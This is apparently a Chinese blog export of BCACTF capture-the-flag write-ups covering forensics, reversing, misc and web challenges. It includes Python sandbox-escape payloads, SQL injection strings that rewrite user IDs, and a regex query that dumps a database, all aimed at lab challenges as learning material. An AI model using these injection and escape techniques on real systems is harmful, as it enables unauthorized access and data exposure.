headers=headers, data=payload)<br>    data = json.loads(response.text)<br>    token = data[<span class="hljs-string">&quot;captchaToken&quot;</span>]<br>    <span class="hljs-keyword">return</span> token<br><br><br>hashes = &#123;&#125;<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./hashes.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        word, md5 = line.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot; &quot;</span>)<br>        hashes[md5] = word<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(total)):<br>    <span class="hljs-comment"># 末尾加上=补齐</span><br>    challengeInfo = base64.standard_b64decode(token.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;===&quot;</span>)<br>    word = hashes[json.loads(challengeInfo)[<span class="hljs-string">&quot;challengeId&quot;</span>]]<br>    token = solve(token, word)<br><span class="hljs-comment"># print(&quot;Here you are:&quot;, token)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[Flag] : http://challs.bcactf.com:30311<span class="hljs-subst">&#123;route&#125;</span>?token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<ol start="6">
<li>访问链接 <code>http://challs.bcactf.com:30311/flag?token=&#123;token&#125;</code> 得到flag。</li>
</ol>
<h1 id="sheep"><a href="#sheep" class="headerlink" title="sheep"></a>sheep</h1><h2 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h2><p>baa</p>
<p>Hints: Figure out what type of file it is and see if there are tools you can use or modify.</p>
<h2 id="附件-1"><a href="#附件-1" class="headerlink" title="附件"></a>附件</h2><p><a href="https://arcs-s3-repo.nyc3.cdn.digitaloceanspaces.com/sheep/sheep.shp">https://arcs-s3-repo.nyc3.cdn.digitaloceanspaces.com/sheep/sheep.shp</a></p>
<h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><ol>
<li><p>参考 <a href="https://blog.csdn.net/wangming100110/article/details/133169695">https://blog.csdn.net/wangming100110/article/details/133169695</a> ，.shp文件是一种矢量数据格式，用于存储GIS信息。</p>
</li>
<li><p>使用在线网站 <a href="https://3dconvert.nsdt.cloud/">https://3dconvert.nsdt.cloud/</a> 进行文件转换后预览，得到flag。</p>
</li>
</ol>
<img src="/2024/06/10/BCACTF/5.png" class="">]]></content>
      <categories>
        <category>ctfwp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>BCACTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BCACTF-1</title>
    <url>/2024/07/15/BCACTF-1/</url>
    <content><![CDATA[<p>做题日常</p>
<h1 id="foren"><a href="#foren" class="headerlink" title="foren"></a>foren</h1><h2 id="23-719"><a href="#23-719" class="headerlink" title="23-719"></a>23-719</h2><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>紧跟时事，给了一个川宝诉讼案相关的pdf文件，通过一番搜索，找到了原始文件 <a href="https://www.supremecourt.gov/opinions/23pdf/23-719_19m2.pdf">https://www.supremecourt.gov/opinions/23pdf/23-719_19m2.pdf</a> ，对比发现抬头被改了。<br>ctrl + A 全选，粘贴后发现了隐藏文字中的flag。</p>
<h2 id="Mysterious-Melody"><a href="#Mysterious-Melody" class="headerlink" title="Mysterious Melody"></a>Mysterious Melody</h2><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>给了一段音频，开头有个十六级的音阶，暗示了十六进制。接着后面一串就是加密数据了。<br>由于有背景音频的干扰，无法使用常规的脚本分析，我这里先采用了ai音频分离，使用的是<a href="https://www.lalal.ai/">https://www.lalal.ai</a> 这个网站，提取出钢琴的音频。</p>
<img src="/2024/07/15/BCACTF-1/0_harmony.png" class="">
<p>接着打开一个扒谱网站，<a href="https://madderscientist.github.io/noteDigger">https://madderscientist.github.io/noteDigger</a> ，可以看到音频信息很好的被呈现了出来。</p>
<img src="/2024/07/15/BCACTF-1/harmony.png" class="">
<p>手工写下数据<code>6263616374667b62656175746966756c5f6d656c6f64795f62656175746966756c5f6861726d6f6e797d</code><br>十六进制转码得到flag。<code>bcactf&#123;beautiful_melody_beautiful_harmony&#125;</code></p>
<h1 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h1><h2 id="Broken-C-Code"><a href="#Broken-C-Code" class="headerlink" title="Broken C Code"></a>Broken C Code</h2><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>给了一段c语言代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here&#x27;s your flag!\n\n&quot;</span>);<br>    <span class="hljs-type">int</span> flag[] = &#123;<span class="hljs-number">9607</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">9412</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">13459</span>, <span class="hljs-number">10407</span>, <span class="hljs-number">15132</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">9028</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">2307</span>, <span class="hljs-number">10003</span>, <span class="hljs-number">4764</span>, <span class="hljs-number">9028</span>, <span class="hljs-number">10407</span>, <span class="hljs-number">5332</span>, <span class="hljs-number">7747</span>, <span class="hljs-number">10204</span>, <span class="hljs-number">4627</span>,<span class="hljs-number">9028</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">5187</span>, <span class="hljs-number">2707</span>, <span class="hljs-number">6087</span>, <span class="hljs-number">5628</span>, <span class="hljs-number">2812</span>, <span class="hljs-number">9028</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">2919</span>, <span class="hljs-number">2503</span>, <span class="hljs-number">2707</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">3139</span>, <span class="hljs-number">2503</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">2919</span>, <span class="hljs-number">15628</span>, <span class="hljs-number">103</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(flag); i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-type">char</span>)<span class="hljs-built_in">sqrt</span>(flag[i++]<span class="hljs-number">-3</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>输出的结果是乱码的</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">bat&#123;_0EfXD74K_6487&#125;RR㈡骀&lt;bgG屜N嬈8o<br></code></pre></td></tr></table></figure>

<p>这个时候将c代码转成python代码就可以得到正确结果了。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> math<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(math.sqrt(i-<span class="hljs-number">3</span>))) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">9607</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">9412</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">13459</span>, <span class="hljs-number">10407</span>, <span class="hljs-number">15132</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">9028</span>, <span class="hljs-number">9804</span>, <span class="hljs-number">2307</span>, <span class="hljs-number">10003</span>, <span class="hljs-number">4764</span>, <span class="hljs-number">9028</span>, <span class="hljs-number">10407</span>, <span class="hljs-number">5332</span>, <span class="hljs-number">7747</span>, <span class="hljs-number">10204</span>, <span class="hljs-number">4627</span>,<span class="hljs-number">9028</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">5187</span>, <span class="hljs-number">2707</span>, <span class="hljs-number">6087</span>, <span class="hljs-number">5628</span>, <span class="hljs-number">2812</span>, <span class="hljs-number">9028</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">2919</span>, <span class="hljs-number">2503</span>, <span class="hljs-number">2707</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">3139</span>, <span class="hljs-number">2503</span>, <span class="hljs-number">3028</span>, <span class="hljs-number">2919</span>, <span class="hljs-number">15628</span>, <span class="hljs-number">103</span>]]))<br></code></pre></td></tr></table></figure>

<h4 id="考点分析"><a href="#考点分析" class="headerlink" title="考点分析"></a>考点分析</h4><p>这里考察的是代码审计能力，在循环条件中，i已经自增了，但在<code>flag[i++]</code>里，i又自增了一次，导致跳过了一般的字符，输出乱码。</p>
<h2 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h2><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>给了一个可执行文件，运行后得到：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Encrypted flag: 21 0F 0A 15 3F 29 29 6B 13 1C 2C 74 7D 30 5E 50 6E 29 2B 24 19 0C 67 7D 05 54 7C 34 5C 13 32 42 29 62 7B 0F 4E <br></code></pre></td></tr></table></figure>
<img src="/2024/07/15/BCACTF-1/xor_1.png" class="">
<p>用<code>010 hexEditor</code>打开，发现一串可疑字符<code>ClkvKOR8JQA1JB731LeGkU7J4d2khDvrOPI63mM7</code><br>使用<code>xor</code>解出flag</p>
<img src="/2024/07/15/BCACTF-1/xor.png" class="">

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="reload-decode"><a href="#reload-decode" class="headerlink" title="reload-decode"></a>reload-decode</h2><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><blockquote>
<p>Greetings neighbor. My name’s Crazy Dave but you can just call me Crazy Dave.<br>I found this weird website that seems to represent something. Says something about taco as a reward<br>Can you find whatever the code is and hand it to me?<br>I could really go for a taco right now</p>
</blockquote>
<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>从源码中找到关键加密部分：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = <span class="hljs-built_in">bytearray</span>(f.read().encode())<br>flag_str = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> flag:<br>    b = b &lt;&lt; <span class="hljs-number">4</span> ^ ((b &lt;&lt; <span class="hljs-number">4</span> &amp; <span class="hljs-number">0xFF</span>) &gt;&gt; <span class="hljs-number">4</span>)<br>    bm = <span class="hljs-number">1</span> &lt;&lt; random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)<br>    cb = b ^ bm<br>    flag_str += <span class="hljs-built_in">bin</span>(cb)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure>
<p>分析一下，<code>b</code>为特定位运算的结果，<code>bm</code>为从<code>2^0 ~ 2^11</code>的掩码，<code>cb</code>为异或后结果。</p>
<p>于是，可以得到解题思路为：</p>
<ol>
<li>从网页上获取到二进制字符串，以12为单位长度划分，对应flag的一个字符。</li>
<li>使用可打印字符通过位运算和异或运算构造一个加密字典。(b &#x3D; b &lt;&lt; 4 ^ ((b &lt;&lt; 4 &amp; 0xFF) &gt;&gt; 4))</li>
<li>让数据分别与<code>2^0 ~ 2^11</code>进行异或运算，再与加密字典中的字符匹配，得到可疑字符（因为得到的字符可能不止一个）。</li>
<li>重复<code>1~3</code>，获得多组可疑字符，再提取其中重复出现的字符，连接形成flag。</li>
</ol>
<h4 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h4><figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> string<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    binstr_list = [<br>        <span class="hljs-string">&quot;111000100010011000110111011000010011011000111011011100000100011101100110011010111011111011101110000100000000011101100111001011010101010110001000010001000101011110100010001000110011001101110111011000110011001011111101010000000010101011011101011100000100011000010101011001110011011011011111011011011101111000110011010001010111011110001001011010011000011000101010011011100110010000100010011010101010000010011001010010001100011110101010011110101000010010010001010010101000011100001000011101100111011000100000010101100111010010101000011100000010010110101000011111011111&quot;</span>,<br>        <span class="hljs-string">&quot;001000100010011000110010011000010101011000110111011101000101011001100111011010111011011111101110001101000000001101110111011011011101010010101000010001110101011100100011101100110011001001110011011000110011011011011101110000000000001010011101011101000101010000010001011000010011111011111111101011011101111000110011010001100111001110001000011010001010011000110010011011101111010110100010001110101010010010001001010010001001110110101010001110101010010010011011010010000000111100000000011111100110111000100010010101111111011010101010011110000000010111101010011111111101&quot;</span>,<br>        <span class="hljs-string">&quot;011100100010011000110111011000000001011100110011001101000100011001000110010110111011011001101110001100000010011101110011001011011100010011001000000001010101111100100010001100010011001001110011011100100011001011011100000000000000001011011111011101000000001000010001011000110010011011011111011011011101011100110011010001111111011111001000011010001010011000100011011011101010010100000010011111101010010010011011000010001000010100101010011110101000000010011001010010011000011100010000011101000110011000100110010100110111011010101010011000000000010110111010011111011001&quot;</span>,<br>        <span class="hljs-string">&quot;001000100010001000110011011000110001011000110010011001000100011001100100011010111011011011101111001000000000011111110111001011001101010010011000010001011101010100100010001100100011001001110110001100110011001011111101110000000000001011011001011101100100011000000001011000111011011111111111000011011101001000110011010101110111011110101000001010001000011000100110010011101110010110100010011110111010010010010001011010001000110110101010011110111010010000011001010010000000011101000000011101100010011000000010010101110011010010101000111100000000000110101010011111011001&quot;</span>,<br>        <span class="hljs-string">&quot;011001100010011000110111011000010000011000110010011111000100011001110110011110111111011011101111001110000000111101110111001011011001010010011000010001000101011100000010001100111011001001110110001100110011001111011101010100000000011011011101011100000100011000010101011010110011011011111101001011011111011001110011000001110111111110001000011000001000011001100010011011001110010101100010001110101010011010011001010010000000010110101000011110101000011010011001011010001000011000000000011001100110011000100110010001110111010010111010011100001000110110101010011111001101&quot;</span>,<br>        <span class="hljs-string">&quot;011000100000011000110001011000010000011010110011011111000100001001100110011111111011011011100110101100000000010101110111101011011101000010001000010001010001011100100011101100110011001001111111011100110111001011011001010001000000001011011001011101010100011000010000011000110010011011111101001011011111111000110011110001110111011110011000011010001100011000110010011111101110011100100010011110111010010110011001010010001100010110101110011110001010011010011001010011001000011100000010011101101110011001100010010101110110000010101010001100000000010110100010111111011101&quot;</span>,<br>    ]<br>    suspicious = []<br>    decode_dict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(string.printable.encode()):<br>        c = b &lt;&lt; <span class="hljs-number">4</span> ^ ((b &lt;&lt; <span class="hljs-number">4</span> &amp; <span class="hljs-number">0xFF</span>) &gt;&gt; <span class="hljs-number">4</span>)<br>        decode_dict[c] = <span class="hljs-built_in">chr</span>(b)<br>    masks = [<span class="hljs-number">1</span> &lt;&lt; i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>)]<br><br>    <span class="hljs-keyword">for</span> binstr <span class="hljs-keyword">in</span> binstr_list:<br>        bin_list = [binstr[i : i + <span class="hljs-number">12</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binstr), <span class="hljs-number">12</span>)]  <span class="hljs-comment"># 12位分组</span><br>        <span class="hljs-keyword">for</span> bin_segment <span class="hljs-keyword">in</span> bin_list:<br>            e = <span class="hljs-built_in">int</span>(bin_segment, <span class="hljs-number">2</span>)<br>            sus = <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">for</span> mask <span class="hljs-keyword">in</span> masks:<br>                masked_value = e ^ mask<br>                <span class="hljs-keyword">if</span> masked_value <span class="hljs-keyword">in</span> decode_dict:<br>                    sus += decode_dict[masked_value]<br>            suspicious.append(sus)<br><br>    num_segments = <span class="hljs-number">47</span><br>    segment_length = <span class="hljs-built_in">len</span>(suspicious) // num_segments<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_segments):<br>        find = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> suspicious[i]:<br>            <span class="hljs-keyword">if</span> find:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(segment_length):<br>                <span class="hljs-keyword">if</span> char <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> suspicious[k * num_segments + i]:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(char, end=<span class="hljs-string">&quot;&quot;</span>)<br>                find = <span class="hljs-literal">True</span><br><br><br>solve()<br></code></pre></td></tr></table></figure>

<h2 id="pyjail-1"><a href="#pyjail-1" class="headerlink" title="pyjail-1"></a>pyjail-1</h2><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>过滤了print + 本地flag变量 + exec 的沙箱逃逸。</p>
<h4 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h4><p>raise OSError(locals()[chr(102) + chr(108) + chr(97) + chr(103)])</p>
<h2 id="pyjail-2"><a href="#pyjail-2" class="headerlink" title="pyjail-2"></a>pyjail-2</h2><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sanitize</span>(<span class="hljs-params">letter</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking for contraband...&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>([i <span class="hljs-keyword">in</span> letter.lower() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> BANNED_CHARS])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">end</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Contraband letters found!\nMessages Deleted!&quot;</span>)<br>    exit()<br><br>BANNED_CHARS = <span class="hljs-string">&quot;gdvxfiyundmnet/\\&#x27;~`@#$%^&amp;.&#123;&#125;0123456789&quot;</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read().strip()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the prison&#x27;s mail center&quot;</span>)<br><br>msg = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nPlease enter your message: &quot;</span>)<br><br><span class="hljs-keyword">while</span> msg != <span class="hljs-string">&quot;&quot;</span>:<br>    <span class="hljs-keyword">if</span> sanitize(msg):<br>        end()<br><br>    <span class="hljs-keyword">try</span>:<br>        x = <span class="hljs-built_in">eval</span>(msg)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x) != <span class="hljs-built_in">len</span>(flag): end()<br>        <span class="hljs-built_in">print</span>(x)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Error occured: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>; Message could not be sent.&#x27;</span>)<br><br>    msg = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nPlease enter your message: &quot;</span>)<br></code></pre></td></tr></table></figure>

<ol>
<li>过滤条件，不能包含字符<code>gdvxfiyundmnet/\\&#39;~`@#$%^&amp;.&#123;&#125;0123456789</code>。</li>
<li>使用<code>eval</code>执行，自带回显。</li>
</ol>
<h4 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h4><p>目标是构造出<code>locals()[&quot;flag&quot;]</code>，但其中<code>f</code>，<code>g</code>以及数字都被过滤了。</p>
<p>但注意到<code>chr</code>没有被过滤，于是我们可以通过其他手段构造出所需要的数字。</p>
<p>python中，<code>all(()) =&gt; 1</code><br>于是，<code>f = chr(102) = chr((all(())+all(())+all(())+all(())+all(())+all(())+all(())&lt;&lt;all(())+all(())+all(())+all(()))-(all(())+all(())&lt;&lt;all(())+all(()))-all(())-all(()))</code> , <code>g = chr(103) = chr((all(())+all(())+all(())+all(())+all(())+all(()) &lt;&lt; all(())+all(())+all(())+all(()))+all(())+all(()) * all(())+all(())+all(())+all(())+all(()))</code></p>
<p>合并得<code>locals()[chr((all(())+all(())+all(())+all(())+all(())+all(())+all(())&lt;&lt;all(())+all(())+all(())+all(()))-(all(())+all(())&lt;&lt;all(())+all(()))-all(())-all(()))+&quot;la&quot;+ chr((all(())+all(())+all(())+all(())+all(())+all(())+all(())&lt;&lt;all(())+all(())+all(())+all(()))-(all(())+all(())&lt;&lt;all(())+all(()))-all(()))]</code></p>
<p>输入程序得到flag ~ <code>bcactf&#123;PyTH0n_M4st3R_Pr0veD&#125;</code></p>
<h2 id="JailBreak-Revenge"><a href="#JailBreak-Revenge" class="headerlink" title="JailBreak Revenge"></a>JailBreak Revenge</h2><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>进阶了一下，过滤了<code>gdvxfiyundmpnetkb/\\&#39;\&quot;~`!@#$%^&amp;*.&#123;&#125;,:;=0123456789#-_|? \t\n\r\x0b\x0c</code></p>
<h4 id="wp-3"><a href="#wp-3" class="headerlink" title="wp"></a>wp</h4><figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">f=<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())))<br>l=<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))&lt;&lt;(<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())))))<br>a=<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+<span class="hljs-built_in">all</span>(())))<br>g=<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())))<br><br><span class="hljs-built_in">locals</span>()[<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())))+<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))&lt;&lt;(<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())))))+<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+<span class="hljs-built_in">all</span>(())))+<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())&lt;&lt;<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(()))+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())+<span class="hljs-built_in">all</span>(())))]<br></code></pre></td></tr></table></figure>
<p>flag : <code>bcactf&#123;Wr1tING_pyJaiL5_iS_hArD_f56450aadefcc&#125;</code></p>
<h1 id="webex"><a href="#webex" class="headerlink" title="webex"></a>webex</h1><h2 id="phone-number"><a href="#phone-number" class="headerlink" title="phone-number"></a>phone-number</h2><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><blockquote>
<p>I was trying to sign into this website, but now it’s<br>asking me for a phone number. The way I’m supposed to<br>input it is strange. Can you help me sign in?<br>My phone number is 1234567890</p>
</blockquote>
<p>题目让我们给 1234567890打电话，但是前端无法输入，简单干掉三个限制就可以拿到flag了。</p>
<img src="/2024/07/15/BCACTF-1/phone_number.png" class="">
<img src="/2024/07/15/BCACTF-1/phone_number_1.png" class="">

<h2 id="“User-1”"><a href="#“User-1”" class="headerlink" title="“User #1”"></a>“User #1”</h2><h4 id="wp-4"><a href="#wp-4" class="headerlink" title="wp"></a>wp</h4><p>进到界面，发现是一个sql注入题，应该是让我们修改自己的id值。<br>先输入双引号进行闭合，得到报错信息<code>unrecognized token: &quot;&quot;1&quot;&quot; WHERE id=1&quot;</code><br>接下来分别构造两个语句，修改admin的id值和自己的id值<br><code>1&quot;,id = 2 WHERE id=0--</code>,<code>1&quot;,id = id-1--</code><br>得到flag<code>bcactf&#123;g3t_BEtA_t3StERs_f6a71451d481a8&#125;</code></p>
<h2 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h2><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><blockquote>
<p>I found this database that does not use SQL,<br>is there any way to break it?</p>
</blockquote>
<h4 id="wp-5"><a href="#wp-5" class="headerlink" title="wp"></a>wp</h4><p>从源码中不难看出，这是一个利用<code>正则表达式</code>来进行检索的数据库。</p>
<p>因此，我们可以构造<code>/?name=.*?</code>来获取所有内容。</p>
